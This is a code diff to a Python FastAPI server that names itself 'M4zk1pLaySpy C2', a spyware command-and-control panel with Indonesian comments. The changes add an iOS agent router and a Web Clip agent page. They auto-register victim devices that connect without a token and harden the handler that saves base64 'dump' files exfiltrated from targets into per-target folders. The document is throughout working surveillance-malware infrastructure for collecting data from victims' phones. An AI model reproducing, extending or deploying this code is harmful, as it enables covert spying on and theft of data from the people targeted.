@@ -2,22 +2,25 @@
 from __future__ import annotations
 
 import asyncio
+import base64
+import hashlib
 import json
-import secrets
 import time
 import uuid
 from pathlib import Path
 from typing import Any
 
-from fastapi import Depends, FastAPI, Form, Request, WebSocket, WebSocketDisconnect
+from fastapi import FastAPI, Form, Request, WebSocket, WebSocketDisconnect
 from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, RedirectResponse
 from fastapi.staticfiles import StaticFiles
 
-from . import (api_admin, api_build, api_control, api_dump, api_targets,
-               config, db, ipgeo, security)
+from . import (api_admin, api_build, api_control, api_dump, api_ios,
+               api_targets, config, db, ipgeo, security)
 from .ws import hub
 
-app = FastAPI(title="M4zk1pLaySpy C2", version="1.4.0", docs_url="/api/docs")
+VERSION = "1.4.1"
+
+app = FastAPI(title="M4zk1pLaySpy C2", version=VERSION, docs_url="/api/docs")
 
 config.ensure_dirs()
 db.init()
@@ -28,6 +31,7 @@ app.include_router(api_control.router)
 app.include_router(api_dump.router)
 app.include_router(api_build.router)
 app.include_router(api_admin.router)
+app.include_router(api_ios.router)
 
 
 # ---------------------------------------------------------------- halaman
@@ -75,6 +79,12 @@ async def admin_page():
     return page("admin.html")
 
 
+@app.get("/agent", response_class=HTMLResponse)
+async def agent_page():
+    """Halaman ringan untuk Web Clip iOS."""
+    return page("agent.html")
+
+
 @app.get("/favicon.ico")
 async def favicon():
     return FileResponse(config.STATIC_DIR / "img" / "garuda.svg", media_type="image/svg+xml")
@@ -98,13 +108,7 @@ async def login(request: Request, license: str = Form(...)):
 
 @app.post("/api/logout")
 async def logout(request: Request):
-    token = request.cookies.get(security.COOKIE)
-    if token:
-        import hashlib
-        import hmac
-        h = hmac.new(str(config.get("agent_token_secret")).encode(),
-                     token.encode(), hashlib.sha256).hexdigest()
-        db.x("DELETE FROM sessions WHERE token=?", (h,))
+    security.kill_session(request.cookies.get(security.COOKIE))
     resp = JSONResponse({"ok": True})
     resp.delete_cookie(security.COOKIE)
     return resp
@@ -149,12 +153,18 @@ async def ws_agent(ws: WebSocket):
     target_id = ""
     try:
         hello_raw = await asyncio.wait_for(ws.receive_text(), timeout=20)
-        hello = json.loads(hello_raw)
+        try:
+            hello = json.loads(hello_raw)
+        except json.JSONDecodeError:
+            await ws.close(code=4400)
+            return
         if hello.get("t") != "hello":
             await ws.close(code=4400)
             return
 
-        token = str(hello.get("token") or "")
+        token = str(hello.get("token") or "").strip()
+        if not token:
+            token = uuid.uuid4().hex
         info: dict[str, Any] = hello.get("info") or {}
         ip = security.client_ip_from_ws(ws)
         existing = db.one("SELECT * FROM targets WHERE token=?", (token,))
@@ -223,7 +233,7 @@ async def ws_agent(ws: WebSocket):
                 await hub.to_operators({"t": "info", "target": target_id, "data": data})
             elif kind == "dump":
                 await _handle_dump(target_id, msg)
-    except (WebSocketDisconnect, asyncio.TimeoutError, json.JSONDecodeError):
+    except (WebSocketDisconnect, asyncio.TimeoutError):
         pass
     finally:
         if target_id:
@@ -232,15 +242,15 @@ async def ws_agent(ws: WebSocket):
 
 
 async def _handle_dump(target_id: str, msg: dict[str, Any]) -> None:
-    import base64
-    import hashlib
-
     kind = str(msg.get("kind") or "lain")
-    name = str(msg.get("name") or f"{kind}_{int(time.time())}.bin").replace("/", "_")
+    raw_name = Path(str(msg.get("name") or f"{kind}_{int(time.time())}.bin")).name
+    name = raw_name.replace("/", "_").replace("\\", "_") or f"{kind}_{int(time.time())}.bin"
     raw = msg.get("b64") or ""
     try:
         blob = base64.b64decode(raw)
     except (ValueError, TypeError):
+        return
+    if not blob:
         return
     folder = config.DUMP_DIR / target_id
     folder.mkdir(parents=True, exist_ok=True)
@@ -261,4 +271,4 @@ async def _handle_dump(target_id: str, msg: dict[str, Any]) -> None:
 
 @app.get("/health")
 async def health():
-    return {"ok": True, "version": "1.4.0", "ts": time.time()}
+    return {"ok": True, "version": VERSION, "ts": time.time()}
